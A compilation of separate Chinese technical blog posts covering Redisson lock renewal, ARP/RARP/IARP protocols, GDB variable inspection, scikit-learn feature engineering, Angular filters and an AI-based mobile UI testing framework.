数据层缓存。Sql缓存，更新机制
实体缓存。全表整理缓存，更新机制
对象缓存。字典缓存，适用用户等数据较多场景。
百亿级性能。字段精炼，索引完备，合理查询，充分利用缓存
实体工厂。元数据，通用处理程序
角色权限。Membership
导入导出。Xml，Json，二进制，网络或文件
分表分库。常见拆分逻辑
高级统计。聚合统计，分组统计
批量写入。批量插入，批量Upsert，异步保存
实体队列。写入级缓存，提升性能。
备份同步。备份数据，恢复数据，同步数据
数据服务。提供RPC接口服务，远程执行查询，例如SQLite网络版
大数据分析。ETL抽取，调度计算处理，结果持久化

 
********************************************************************************************************************************************************************************************************
面试官问我，Redis分布式锁如何续期？懵了。
前言
上一篇[面试官问我，使用Dubbo有没有遇到一些坑？我笑了。]之后,又有一位粉丝和我说在面试过程中被虐了.鉴于这位粉丝是之前肥朝的粉丝,而且周一又要开启新一轮的面试,为了回馈他长期以来的支持,所以连夜写了本篇,希望能对他接下来的面试有所帮助.
真实案例

Redis分布式锁的正确姿势
据肥朝了解,很多同学在用分布式锁时,都是直接百度搜索找一个Redis分布式锁工具类就直接用了.关键是该工具类中还充斥着很多System.out.println();等语句.其实Redis分布式锁比较正确的姿势是采用redisson这个客户端工具.具体介绍可以搜索最大的同性交友网站github.
如何回答
首先如果你之前用Redis的分布式锁的姿势正确,并且看过相应的官方文档的话,这个问题So easy.我们来看

坦白说,如果你英文棒棒哒那么看英文文档可能更好理解
By default lock watchdog timeout is 30 seconds and can be changed through Config.lockWatchdogTimeout setting.
但是你如果看的是中文文档
看门狗检查锁的超时时间默认是30秒
这句话肥朝从语文角度分析就是一个歧义句,他有两个意思
1.看门狗默认30秒去检查一次锁的超时时间2.看门狗会去检查锁的超时时间,锁的时间时间默认是30秒
看到这里,我希望大家不要黑我的小学体育老师,虽然他和语文老师是同个人.语文不行,我们可以源码来凑!
源码分析
我们根据官方文档给出的例子,写了一个最简单的demo,例子根据上面截图中Ctr+C和Ctr+V一波操作,如下


 1public class DemoMain {
 2
 3    public static void main(String[] args) throws Exception {
 4        Config config = new Config();
 5        config.useSingleServer().setAddress("redis://127.0.0.1:6379");
 6
 7        RedissonClient redisson = Redisson.create(config);
 8        RLock lock = redisson.getLock("anyLock");
 9
10        lock.lock();
11        //lock.unlock();
12    }
13}


create

从这里我们知道,internalLockLeaseTime 和 lockWatchdogTimeout这两个参数是相等的.


lockWatchdogTimeout默认值如下

 1public class Config {
 2
 3    private long lockWatchdogTimeout = 30 * 1000;
 4
 5    public long getLockWatchdogTimeout() {
 6        return lockWatchdogTimeout;
 7    }
 8
 9    //省略无关代码
10}


从internalLockLeaseTime这个单词也可以看出,这个加的分布式锁的超时时间默认是30秒.但是还有一个问题,那就是这个看门狗,多久来延长一次有效期呢?我们往下看
lock

从我图中框起来的地方我们就知道了,获取锁成功就会开启一个定时任务,也就是watchdog,定时任务会定期检查去续期renewExpirationAsync(threadId).
这里定时用的是netty-common包中的HashedWheelTimer,肥朝公众号已经和各大搜索引擎建立了密切的合作关系,你只需要把这个类在任何搜索引擎一搜,都能知道相关API参数的意义.
从图中我们明白,该定时调度每次调用的时间差是internalLockLeaseTime / 3.也就10秒.
真相大白
通过源码分析我们知道,默认情况下,加锁的时间是30秒.如果加锁的业务没有执行完,那么到 30-10 = 20秒的时候,就会进行一次续期,把锁重置成30秒.那这个时候可能又有同学问了,那业务的机器万一宕机了呢?宕机了定时任务跑不了,就续不了期,那自然30秒之后锁就解开了呗.
写在最后
如果你是肥朝公众号的老粉丝,并且在面试、工作过程中遇到了什么问题,欢迎来撩.但是肥朝是个正经的Java开发,我们只调接口,不调情!
作者：肥朝
 
免费Java资料领取，涵盖了Java、Redis、MongoDB、MySQL、Zookeeper、Spring Cloud、Dubbo/Kafka、Hadoop、Hbase、Flink等高并发分布式、大数据、机器学习等技术。传送门： https://mp.weixin.qq.com/s/JzddfH-7yNudmkjT0IRL8Q
********************************************************************************************************************************************************************************************************
ARP和RARP协议详解
ARP概述
为什么要用ARP？即ARP的作用

(1) TCP/IP 的32bit的IP地址，仅知道主机的IP地址不能让内核发送数据帧给主机
(2) 网络接口的硬件地址，它是一个48bit的值，用来标识不同的以太网或令牌环网络接口
 在硬件层次上，进行数据交换必须有正确的接口地址，内核必须知道目的端的硬件地址才能发送数据

在以太网中，一台主机要把数据帧发送到同一局域网上的另一台主机时
设备驱动程序必须知道以太网地址才能发送数据
而我们只知道IP地址，这时就需要采用ARP协议将IP地址映射为以太网地址
( 以太网地址即：硬件地址 MAC )
ARP在OSI模型中的位置
OSI模型有七层，TCP在第4层传输层，IP在第3层网络层，而ARP在第2层数据链路层
高层对低层是有强依赖的，所以TCP的建立前要进行ARP的请求和应答
ARP高速缓存表在IP层使用
如果每次建立TCP连接都发送ARP请求，会降低效率，因此在主机、交换机、路由器上都会有ARP缓存表
建立TCP连接时先查询ARP缓存表，如果有效，直接读取ARP表项的内容进行第二层数据包的发送；
只有表失效时才进行ARP请求和应答进行MAC地址的获取，以建立TCP连接
ARP高速缓存
每个主机都有一个ARP高速缓存表，这样避免每次发包时都需要发送ARP请求来获取硬件地址
默认老化时间是20分钟，利用arp -a命令可以查看显示系统中高速缓存的内容
Windows下arp -d命令可以清除arp高速缓存表
ARP分组帧格式


字段1 ARP请求的目的以太网地址，全1时代表广播地址
字段2 发送ARP请求(源主机)的以太网地址
字段3 以太网帧类型；于ARP协议，该字段为0x0806；对于RARP协议，该字段为0x8035
字段4 硬件地址的类型，硬件地址不只以太网一种，是以太网类型时此值为1
字段5 表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800。
字段6和7表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节。
字段8 操作类型字段，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）
字段9 发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。
字段10 发送ARP请求或应答的IP地址
字段11和12是目的端的硬件地址和协议地址。
下边两张图，分别是，ARP请求包和响应包

 



代理ARP
代理ARP就是通过使用一个主机(通常为router)
来作为指定的设备使用自己的 MAC 地址来对另一设备的ARP请求作出应答
为什么要用代理ARP
先要了解，路由器的重要功能之一就是把局域网的广播包限制在该网内，阻止其扩散，否则会造成网络风暴。
ARP请求是个广播包，它询问的对象如果在同一个局域网内，就会收到应答
但是如果询问的对象不在同一个局域网该如何处理？路由器就提供的代理ARP为这个问题提供了解决方案。
工作过程
两台主机A和B处于同一网段但不同的广播段时，主机A发送ARP请求主机B的MAC地址时
因为路由器不转发广播包的原因，ARP请求只能到达路由器
如果路由器启用了代理ARP功能，并知道主机B属于它连接的网络
那么路由器就用自己接口的MAC地址代替主机B的MAC地址来对主机A进行ARP应答
主机A接收ARP应答，但并不知道代理ARP的存在
优点：
代理ARP能在不影响路由表的情况下添加一个新的Router，使子网对该主机变得透明化
一般代理ARP应该使用在主机没有配置默认网关或没有任何路由策略的网络上
缺点：
从工作工程可以看到，这其实是一种ARP欺骗。
而且，通过两个物理网络之间的路由器的代理ARP功能
其实互相隐藏了物理网络，这导致无法对网络拓扑进行网络概括。
此外，代理ARP增加了使用它的那段网络的ARP流量，主机需要更大的ARP缓存空间
也不会为不使用ARP进行地址解析的网络工作
RARP：逆地址解析协议
将局域网中某个主机的物理地址转换为IP地址
比如局域网中有一台主机只知道物理地址而不知道IP地址
那么可以通过RARP协议发出征求自身IP地址的广播请求，然后由RARP服务器负责回答
RARP协议广泛应用于无盘工作站引导时获取IP地址。
RARP允许局域网的物理机器从网管服务器ARP表或者缓存上请求其IP地址。
存在的问题
RARP通过非常精简的交互实现了IP地址的获取，但同时也暴露了一些问题：
① RARP Server必须提前将MAC和IP的映射静态绑定在本地；
 若没有提前绑定，则电脑用自己MAC询问时，Server也不会回应；
② RARP Server只能给电脑分配IP地址，不包括其他信息，包括网关、DNS等信息；
③ RARP基于二层封装，只能运行在同一网段；每个网段分配地址，都需要一个RARP Server。

在RARP的基础上，后面又有了Bootp协议，直译过来便是"启动协议"，功能同RARP
也是用于电脑接入网络时，用来获取IP地址的
但是毕竟做了增强，Bootp协议能让电脑启动时不仅仅获取IP地址
而且能获取到网关地址从而让电脑实现跨网段通信

Bootp协议虽然让电脑能够获取到更多的信息，但是仍然没有解决最大的问题：
服务器仍然需要提前手工绑定MAC和IP地址，而对于现在的移动网络或者公共网络而言，这根本无法实现。
因为用户什么时候接入，接入的MAC是多少，管理员没法提前知道。
这就有了后面的DHCP，DHCP通过动态分配的方式解决了这个诟病
并且通过DHCP中继技术实现了跨网段地址分配，实现了全网IP地址的统一管理。
小结：
RARP是一种逝去的地址分配技术，是Bootp和DHCP的鼻祖
目前我们的电脑基本不会用到这个协议，只有部分无盘工作站等情况需要用到
IARP反向地址解析协议
 (Inverse Address Resolution Protocol)是DLCI到IP的映射，他应用的场景不是以太网，而是在帧中继网络里面

DLCI即数据链路连接标识（Data Link Connection Identifier）
是帧中继网络里面的二层地址，好比以太网里面的MAC地址，用于标记帧中继里面的虚拟专线
帧中继协议是一种统计复用的协议，它在单一物理传输线路上能够提供多条虚电路
DLCI由SAPI和TEI组成，用来唯一的识别一个数据链路连接
DLCI只具有局部意义,即交换机上不同的端口可以使用相同的DLCI号



IARP不像ARP协议可以实时交互，它是周期性运行的
通信双方若丢失IARP映射表，则需要等待到固定的时间交互才能重新生成并通信。
另外不同厂商不同型号对IARP的兼容性也可能不同。
基于这些原因，一般建议直接关闭IARP协议，采用静态绑定的方式生成映射表
总结
ARP是把IP地址转换为MAC地址的协议；一般ARP协议只适用于局域网
RARP用于实现MAC到IP的映射，本质就是为了获取IP地址，是Bootp和DHCP协议的鼻祖；
IARP用于实现帧中继网络中DLCI到IP地址的映射，生成帧中继映射表（类似ARP表），实现数据封装与通信；
相比ARP、免费ARP、代理ARP、ARP攻防等技术，RARP和IARP随着技术的更新迭代正在退出历史舞台
成为"被遗忘的兄弟协议" （对于初学者来说，也算是个好事，因为终于不用"翻转""反向""逆向"各种分不清了）
 
********************************************************************************************************************************************************************************************************
GDB调试指南-变量查看
前言
在启动调试以及设置断点之后，就到了我们非常关键的一步-查看变量。GDB调试最大的目的之一就是走查代码，查看运行结果是否符合预期。既然如此，我们就不得不了解一些查看各种类型变量的方法，以帮助我们进一步定位问题。

准备工作
在查看变量之前，需要先启动调试并设置断点，该部分内容可参考《GDB调试指南－启动调试》和《GDB调试指南－断点设置》。后面的内容都基于在某个位置已经断住。
本文辅助说明程序如下:testGdb.c
//testGdb.c#include<stdio.h>#include<stdlib.h>#include"testGdb.h"int main(void){    int a = 10; //整型    int b[] = {1,2,3,5};  //数组    char c[] = "hello,shouwang";//字符数组    /*申请内存，失败时退出*/        int *d = (int*)malloc(a*sizeof(int));    if(NULL == d)    {        printf("malloc error\n");        return -1;    }    /*赋值*/    for(int i=0; i < 10;i++)    {        d[i] = i;    }    free(d);    d = NULL;    float e = 8.5f;    return 0;}
testGdb.h
int a = 11;
编译：
$ gcc -g -o testGdb testGdb.o
变量查看
打印基本类型变量，数组，字符数组
最常见的使用便是使用print（可简写为p）打印变量内容。例如，打印基本类型，数组，字符数组等直接使用p 变量名即可：
(gdb) p a$1 = 10(gdb) p b$2 = {1, 2, 3, 5}(gdb) p c$3 = "hello,shouwang"(gdb) 
当然有时候，多个函数或者多个文件会有同一个变量名，这个时候可以在前面加上文件名或者函数名来区分：
(gdb) p 'testGdb.h'::a$1 = 11(gdb) p 'main'::b$2 = {1, 2, 3, 5}(gdb) 
这里所打印的a值是我们定义在testGdb.h文件里的，而b值是main函数中的b。
打印指针指向内容
如果还是使用上面的方式打印指针指向的内容，那么打印出来的只是指针地址而已，例如：
(gdb) p d$1 = (int *) 0x602010(gdb) 
而如果想要打印指针指向的内容，需要解引用：
(gdb) p *d$2 = 0(gdb) p *d@10$3 = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}(gdb) 
从上面可以看到，仅仅使用*只能打印第一个值，如果要打印多个值，后面跟上@并加上要打印的长度。或者@后面跟上变量值：
(gdb) p *d@a$2 = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}(gdb) 
由于a的值为10，并且是作为整型指针数据长度，因此后面可以直接跟着a，也可以打印出所有内容。
另外值得一提的是，$可表示上一个变量，而假设此时有一个链表linkNode，它有next成员代表下一个节点，则可使用下面方式不断打印链表内容：
(gdb) p *linkNode(这里显示linkNode节点内容)(gdb) p *$.next(这里显示linkNode节点下一个节点的内容)
如果想要查看前面数组的内容，你可以将下标一个一个累加，还可以定义一个类似UNIX环境变量，例如：
(gdb) set $index=0(gdb) p b[$index++]$11 = 1(gdb) p b[$index++]$12 = 2(gdb) p b[$index++]$13 = 3
这样就不需要每次修改下标去打印啦。
按照特定格式打印变量
对于简单的数据，print默认的打印方式已经足够了，它会根据变量类型的格式打印出来，但是有时候这还不够，我们需要更多的格式控制。常见格式控制字符如下：

x 按十六进制格式显示变量。
d 按十进制格式显示变量。
u 按十六进制格式显示无符号整型。
o 按八进制格式显示变量。
t 按二进制格式显示变量。
a 按十六进制格式显示变量。
c 按字符格式显示变量。
f 按浮点数格式显示变量。

还是以辅助程序来说明，正常方式打印字符数组c：
(gdb) p c$18 = "hello,shouwang"
但是如果我们要查看它的十六进制格式打印呢？
(gdb) p/x c$19 = {0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x73, 0x68, 0x6f, 0x75, 0x77, 0x61,   0x6e, 0x67, 0x0}(gdb)
但是如果我们想用这种方式查看浮点数的二进制格式是怎样的是不行的，因为直接打印它首先会被转换成整型，因此最终会得到8：
(gdb) p e$1 = 8.5(gdb) p/t e$2 = 1000(gdb) 
那么就需要另外一种查看方式了。
查看内存内容
examine(简写为x)可以用来查看内存地址中的值。语法如下：
x/[n][f][u] addr
其中：

n 表示要显示的内存单元数，默认值为1
f 表示要打印的格式，前面已经提到了格式控制字符
u 要打印的单元长度
addr 内存地址

单元类型常见有如下：

b 字节
h 半字，即双字节
w 字，即四字节
g 八字节

我们通过一个实例来看，假如我们要把float变量e按照二进制方式打印，并且打印单位是一字节：
(gdb) x/4tb &e0x7fffffffdbd4:    00000000    00000000    00001000    01000001(gdb) 
可以看到，变量e的四个字节都以二进制的方式打印出来了。
自动显示变量内容
假设我们希望程序断住时，就显示某个变量的值，可以使用display命令。
(gdb) display e1: e = 8.5
那么每次程序断住时，就会打印e的值。要查看哪些变量被设置了display，可以使用：
(gdb)info displayAuto-display expressions now in effect:Num Enb Expression1:   y  b2:   y  e
如果想要清除可以使用
delete display num #num为前面变量前的编号,不带num时清除所有。
或者去使能：
disable display num  #num为前面变量前的编号，不带num时去使能所有

微信公众号【编程珠玑】：专注但不限于分享计算机编程基础，Linux，C语言，C++，算法，数据库等编程相关[原创]技术文章，号内包含大量经典电子书和视频学习资源。欢迎一起交流学习，一起修炼计算机“内功”，知其然，更知其所以然。
公众号编程珠玑
查看寄存器内容
(gdb)info registersrax            0x0    0rbx            0x0    0rcx            0x7ffff7dd1b00    140737351850752rdx            0x0    0rsi            0x7ffff7dd1b30    140737351850800rdi            0xffffffff    4294967295rbp            0x7fffffffdc10    0x7fffffffdc10(内容过多未显示完全)
总结
通过不同方式查看变量值或者内存值能够极大的帮助我们判断程序的运行是否符合我们的预期，如果发现观察的值不是我们预期的时候，就需要检查我们的代码了。
********************************************************************************************************************************************************************************************************
【学习笔记】机器学习之特征工程

    目录
    
        
        特征工程
        数据的特征抽取
        字典特征抽取
        文本特征抽取
        
        数据的特征预处理
        归一化
        标准化
        缺失值处理
        
        特征选择
        降纬
        
    

特征工程
从数据中抽取出来的对预测结果有用的信息，通过专业的技巧进行数据处理，是的特征能在机器学习算法中发挥更好的作用。优质的特征往往描述了数据的固有结构。 最初的原始特征数据集可能太大，或者信息冗余，因此在机器学习的应用中，一个初始步骤就是选择特征的子集，或构建一套新的特征集，减少功能来促进算法的学习，提高泛化能力和可解释性。
特征工程是将原始数据转换为更好地代表预测模型的潜在问题的特征的过程，从而提高了对未知数据的模型准确性。
特征工程的意义：

更好的特征意味着更强的鲁棒性
更好的特征意味着只需用简单模型
更好的特征意味着更好的结果

特征处理：
特征工程中最重要的一个环节就是特征处理，特征处理包含了很多具体的专业技巧

特征预处理

单个特征

归一化
标准化
缺失值

多个特征

降维

PCA




特征工程之特征抽取与特征选择：
如果说特征处理其实就是在对已有的数据进行运算达到我们目标的数据标准。特征抽取则是将任意数据格式（例如文本和图像）转换为机器学习的数字特征。而特征选择是在已有的特征中选择更好的特征。后面会详细介绍特征选择主要区别于降维。
安装Scikit-learn机器学习库：
创建一个基于Python3的虚拟环境：
mkvirtualenv -p /usr/local/bin/python3.6 ml3
在ubuntu的虚拟环境当中运行以下命令
pip3 install Scikit-learn
数据的特征抽取
现实世界中多数特征都不是连续变量，比如分类、文字、图像等，为了对非连续变量做特征表述，需要对这些特征做数学化表述，因此就用到了特征提取. sklearn.feature_extraction提供了特征提取的很多方法
字典特征抽取
sklearn.feature_extraction.DictVectorizer(sparse = True)
将映射列表转换为Numpy数组或scipy.sparse矩阵

sparse 是否转换为scipy.sparse矩阵表示，默认开启

方法：
fit_transform(X,y)：应用并转化映射列表X，y为目标类型
inverse_transform(X[, dict_type])：将Numpy数组或scipy.sparse矩阵转换为映射列表
from sklearn.feature_extraction import DictVectorizer

# 字典特征抽取
d = DictVectorizer()

data = d.fit_transform([{'city': '北京', 'temperature': 100}, {'city': '上海', 'temperature': 60},
                        {'city': '深圳', 'temperature': 30}])
# 获取特征名称
print(d.get_feature_names())
print(d.inverse_transform(data))
# 特征结果数据
print(data)
输出结果：
['city=上海', 'city=北京', 'city=深圳', 'temperature']
[{'city=北京': 1.0, 'temperature': 100.0}, {'city=上海': 1.0, 'temperature': 60.0}, {'city=深圳': 1.0, 'temperature': 30.0}]
  (0, 1)    1.0
  (0, 3)    100.0
  (1, 0)    1.0
  (1, 3)    60.0
  (2, 2)    1.0
  (2, 3)    30.0
如果按照数值来表示字典（例如1表示上海，2表示北京，3表示深圳），可能会对结果有较大的影响，上面的结果使用的是one-hot编码，如下：




北京
上海
深圳
temperature




0
0
1
0
100.0


1
1
0
0
60.0


2
0
0
1
30.0



文本特征抽取
文本的特征提取应用于很多方面，比如说文档分类、垃圾邮件分类和新闻分类。那么文本分类是通过词是否存在、以及词的概率（重要性）来表示。
(1)文档的中词的出现次数：
数值为1表示词表中的这个词出现，为0表示未出现
sklearn.feature_extraction.text.CountVectorizer()：将文本文档的集合转换为计数矩阵（scipy.sparse matrices）
方法：fit_transform(raw_documents,y)
学习词汇词典并返回词汇文档矩阵
from sklearn.feature_extraction.text import CountVectorizer

cv = CountVectorizer()
data = cv.fit_transform(["life is short,i like python",
                         "life is too long,i dislike python"])
print(cv.get_feature_names())
print(data)
输出结果：
['dislike', 'is', 'life', 'like', 'long', 'python', 'short', 'too']
  (0, 5)    1
  (0, 3)    1
  (0, 6)    1
  (0, 1)    1
  (0, 2)    1
  (1, 0)    1
  (1, 4)    1
  (1, 7)    1
  (1, 5)    1
  (1, 1)    1
  (1, 2)    1
对于中文文本进行特征抽取结果不理想，从下面的结果可以看出对于中文，只用逗号分隔符进行了分隔。对于中文应该先使用分词器进行分词，然后再使用分隔符进行连接就行了。
from sklearn.feature_extraction.text import CountVectorizer

cv = CountVectorizer()
data = cv.fit_transform(["人生苦短,我喜欢python",
                         "人生太长,我不用python"])
print(cv.get_feature_names())
print(data)
输出结果：
['人生太长', '人生苦短', '我不喜欢python', '我不用python']
  (0, 3)    1
  (0, 1)    1
  (1, 2)    1
  (1, 0)    1
使用中文分词器来处理
from sklearn.feature_extraction.text import CountVectorizer
import jieba

cv = CountVectorizer()
content = ["人生苦短,我喜欢python", "人生太长,我不用python"]
content = [" ".join(list(jieba.cut(i, cut_all=True))) for i in content]
data = cv.fit_transform(content)
print(cv.get_feature_names())
print(data)
输出结果：
['python', '不用', '人生', '喜欢', '太长', '苦短']
  (0, 0)    1
  (0, 3)    1
  (0, 5)    1
  (0, 2)    1
  (1, 1)    1
  (1, 4)    1
  (1, 0)    1
  (1, 2)    1
(2)TF-IDF表示词的重要性:
TF-IDF的主要思想是：如果某个词或短语在一篇文章中出现的概率高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类。
TF-IDF作用：用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度。
TfidfVectorizer会根据指定的公式将文档中的词转换为概率表示。
sklearn.feature_extraction.text.TfidfVectorizer()
方法：fit_transform(raw_documents,y)，学习词汇和idf，返回术语文档矩阵。
from sklearn.feature_extraction.text import TfidfVectorizer
content = ["life is short,i like python","life is too long,i dislike python"]
vectorizer = TfidfVectorizer(stop_words='english')
print(vectorizer.fit_transform(content).toarray())
print(vectorizer.vocabulary_)
数据的特征预处理
特征处理是通过特定的统计方法（数学方法）将数据转换成算法要求的数据。
归一化
归一化首先在特征（维度）非常多的时候，可以防止某一维或某几维对数据影响过大，也是为了把不同来源的数据统一到一个参考区间下，这样比较起来才有意义，其次可以程序可以运行更快。
特点：通过对原始数据进行变换把数据映射到(默认为[0,1])之间

注：作用于每一列，max为一列的最大值，min为一列的最小值,那么X’’为最终结果，mx，mi分别为指定区间值默认mx为1,mi为0。
MinMaxScalar(feature_range=(0, 1)

每个特征缩放到给定范围(默认[0,1])
方法：fit_transform(X)

X:numpy array格式的数据[n_samples,n_features]
返回值：转换后的形状相同的array


from sklearn.preprocessing import MinMaxScaler
mm = MinMaxScaler(feature_range=(0, 1))
data = mm.fit_transform([[90, 2, 10, 40], [60, 4, 15, 45], [75, 3, 13, 46]])
print(data)
输出结果：
[[1.         0.         0.         0.        ]
 [0.         1.         1.         0.83333333]
 [0.5        0.5        0.6        1.        ]]
注意在特定场景下最大值最小值是变化的，另外，最大值与最小值非常容易受异常点影响，所以这种方法鲁棒性较差，只适合传统精确小数据场景。
标准化
通过对原始数据进行变换把数据变换到均值为0,方差为1范围内。
公式：
注：作用于每一列，mean为平均值，σ为标准差（考虑数据的稳定性）
std为方差，
对于归一化来说：如果出现异常点，影响了最大值和最小值，那么结果显然 会发生改变。对于标准化来说,如果出现异常点，由于具有一定数据量，少量的异常点对于平均值的影响并不大，从而方差改变较小。
StandardScaler(...)：

处理之后每列来说所有数据都聚集在均值0附近方差为1
StandardScaler.fit_transform(X,y)

X:numpy array格式的数据[n_samples,n_features]
返回值：转换后的形状相同的array


from sklearn.preprocessing import StandardScaler
s = StandardScaler()
data = s.fit_transform([[1., -1., 3.], [2., 4., 2.], [4., 6., -1.]])
print(data)
输出结果：
[[-1.06904497 -1.35873244  0.98058068]
 [-0.26726124  0.33968311  0.39223227]
 [ 1.33630621  1.01904933 -1.37281295]]
缺失值处理
由于各种原因，许多现实世界的数据集包含缺少的值，通常编码为空白，NaN或其他占位符。然而，这样的数据集与scikit的分类器不兼容，它们假设数组中的所有值都是数字，并且都具有和保持含义。使用不完整数据集的基本策略是丢弃包含缺失值的整个行和/或列。然而，这是以丢失可能是有价值的数据（即使不完整）的代价。更好的策略是估算缺失值，即从已知部分的数据中推断它们。
填充缺失值 使用sklearn.preprocessing中的Imputer类进行数据的填充
from sklearn.preprocessing import Imputer
import numpy as np
im = Imputer(missing_values="NaN", strategy="mean", axis=0)
data = im.fit_transform([[1, 2], [np.nan, 4], [5, np.nan]])
print(data)
输出结果：
[[1. 2.]
 [3. 4.]
 [5. 3.]]
特征选择
特征选择就是单纯地从提取到的所有特征中选择部分特征作为训练集特征，特征在选择前和选择后可以改变值、也不改变值，但是选择后的特征维数肯定比选择前小，毕竟我们只选择了其中的一部分特征。
特征选择的原因：

冗余：部分特征的相关度高，容易消耗计算性能
噪声：部分特征对预测结果有负影响

降维本质上是从一个维度空间映射到另一个维度空间，特征的多少并没有减少，当然在映射的过程中特征值也会相应的变化。举个例子，现在的特征是1000维，我们想要把它降到500维。降维的过程就是找个一个从1000维映射到500维的映射关系。原始数据中的1000个特征，每一个都对应着降维后的500维空间中的一个值。假设原始特征中有个特征的值是9，那么降维后对应的值可能是3。而对于特征选择来说，有很多方法：

Filter(过滤式):VarianceThreshold
Embedded(嵌入式)：正则化、决策树
Wrapper(包裹式)

其中过滤式的特征选择后，数据本身不变，而数据的维度减少。而嵌入式的特征选择方法也会改变数据的值，维度也改变。Embedded方式是一种自动学习的特征选择方法，后面讲到具体的方法的时候就能理解了。
特征选择主要有两个功能：
（1）减少特征数量，降维，使模型泛化能力更强，减少过拟合
（2）增强特征和特征值之间的理解
sklearn特征选择API：sklearn.feature_selection.VarianceThreshold
删除所有低方差特征：VarianceThreshold(threshold = 0.0)
方法：VarianceThreshold.fit_transform(X,y)

X:numpy array格式的数据[n_samples,n_features]
返回值：训练集差异低于threshold的特征将被删除。
默认值是保留所有非零方差特征，即删除所有样本中具有相同值的特征。

from sklearn.feature_selection import VarianceThreshold
var = VarianceThreshold(threshold=1.0)
data = var.fit_transform([[0, 2, 0, 3], [0, 1, 4, 3], [0, 1, 1, 3]])
print(data)
输出结果：
[[0]
 [4]
 [1]]
降纬
PCA（Principal component analysis），主成分分析。特点是保存数据集中对方差影响最大的那些特征，PCA极其容易受到数据中特征范围影响，所以在运用PCA前一定要做特征标准化，这样才能保证每维度特征的重要性等同。
本质：PCA是一种分析、简化数据集的技术
目的：是数据维数压缩，尽可能降低原数据的维数（复杂度），损失少量信息。
作用：可以削减回归分析或者聚类分析中特征的数量
PCA语法：
PCA(n_components=None)

将数据分解为较低维数空间
PCA.fit_transform(X)

X:numpy array格式的数据[n_samples,n_features]
返回值：转换后指定维度的array


from sklearn.decomposition import PCA
pca = PCA(n_components=0.9)
data = pca.fit_transform([[2, 8, 4, 5], [6, 3, 0, 8], [5, 4, 9, 1]])
print(data)
输出结果：
[[ 1.28620952e-15  3.82970843e+00]
 [ 5.74456265e+00 -1.91485422e+00]
 [-5.74456265e+00 -1.91485422e+00]]
********************************************************************************************************************************************************************************************************
Angular过滤器
内置过滤器
1、currency（货币处理）
　　currency可以将数字格式转化为货币的形式，如果不传参数，默认为$。

1 {{num|currency:"￥"}}

　　展现的形式为￥xxx。
2、date（日期格式化）
　　angular中提供的date过滤器能够满足一般的时间格式要求。

{{date|date:'y-m-d h:m:s EEEE'}}

　　展现形式为：年-月-日 时：分：秒 星期，它们之间的格式可以自由组合，脱离了原生js中的单调和复杂性。
3、filter（匹配字符串）
　　filter用来处理数组，然后可以挑选出含有的所选中的子串元素，作为子数组来返回。可以是字符串数组，也可以是对象数组。如果是对象数组，可以匹配属性的值，它接受一个参数，来定义子串的规则。

1 $scope.arr = ["Monday","Tuesday","星期三","星期四","周五","周六"];


1 <li>{{arr|filter:'d'}}</li>
2 <li>{{arr|filter:'周'}}</li>

　　它能选出数组中含有字母“d”、含有汉子“周”的元素，然后分别以数组的形式返回。
4、json（格式化json对象）
　　json过滤器可以把一个js对象格式化为json字符串，没有参数。这东西有什么用呢，官网说它 可以用来进行调试，嗯，是个不错的选择。或者，也可以用在js中使用，作用就和我们熟悉的JSON.stringify()一样。

1 {{ jsonTest | json}}

5、limitTo（限制数组长度或字符串长度）
　　limitTo过滤器用来截取数组或者字符串的长度，接收一个参数用来指定要截取的数组或者字符串的长度，如果值为负数，那么就从数组或者字符串的尾部开始截取。

1 <li>{{arr|limitTo:'3'}}</li>

　　它会截取数组arr的前三位，然后以数组的形式返回。
6、lowercase（小写格式）
　　把英文字母全部转化成小写的形式，也没有太大的用处。没有参数。

<li>{{da|lowercase}}</li>

　　这里只能转换英文，遇到其他的则不转换。
7、uppercase（大写格式）
　　这个的写法跟lowercase相同。
8、number（格式化数字）
　　number过滤器可以为一串数字进行分位，相当于千位分割符，如：123,456,789。可以接收一个参数，指定float类型保留几位小数。

<li>{{num|number:2}}</li>

　　这个就表示保留小数点后两位。
9、orderBy（排序）
　　orderBy过滤器可以将数组中的元素进行排序，接收一个参数指定排序的规则，参数可以是字符串，表示以这个属性名称进行排序；可以是一个函数，定义排序属性；可以是一个数组，表示依次按数组的属性值进行排序。

1 $scope.err = [
2             {name : 'jack',age : 30},
3             {name : 'mack',age : 24},
4             {name : 'sunny',age : 28},
5             {name : 'jim',age : 20},
6             ]


1 <li>{{err|orderBy:'age':true}}</li>

　　这个就是以age的从大到小进行排序。
自定义过滤器

 1 <div ng-controller = 'con'>
 2         <div>{{msg|prz}}</div>
 3     </div>
 4     <script src="public/libs/angular/angular.min.js"></script>
 5     <script>
 6         var App = angular.module('App',[]);
 7         App.controller('con',['$scope',function($scope){
 8             $scope.msg = 'you can kill';
 9         }])
10         App.filter('prz',function(){
11             return function(z){
12                 return z[0].toUpperCase()+z.slice(1); 
13             }
14         })
15     </script>

　　上面代码表示，自定义一个首字母大写的过滤器。
********************************************************************************************************************************************************************************************************
AI移动自动化测试框架设计(解读)
声明：原文出自“前端之巅”微信公众号“爱奇艺基于AI的移动端自动化测试框架的设计”一文，作者：何梁伟，爱奇艺Android架构师。文章提供了一种基于AI算法的自动化测试框架AIon，该框架并未开源，目前搜索不到相关资料，但从作者的设计思路上很受启发。

理想种的移动UI自动化框架：

易于开发和维护
稳定性
执行效率
跨平台
跨应用
支持Hybrid（混合应用）

传统的UI自动化框架（UIAutomator、Espresso、appium等），或多或少在这些方法做的不够完美。

那么理想中的框架应该是什么样的？
模拟用户的操作，用户在操作的时候是不需要知道控件的属性（ID、name）的，它应该是一种所见即所得的操作。
所以，像Sikuli 、AirTest这样的基于图片识别技术的测试框架就很好。
但是，它们也有一些不足：

准确率不足
没有层次结构
代码稳定性差
代码可维护性差

如果，测试脚本可以变成这样：

这个样的脚本表达接近我们的自然语言。比如，点击标签上的会员按钮，就变成 find('tab').find('会员')，代码的维护性也会变得很好。

要实现这样的框架需要哪些技术：

图像切割
图像分类识别
OCR文字识别
图像相似度匹配
像素点操作

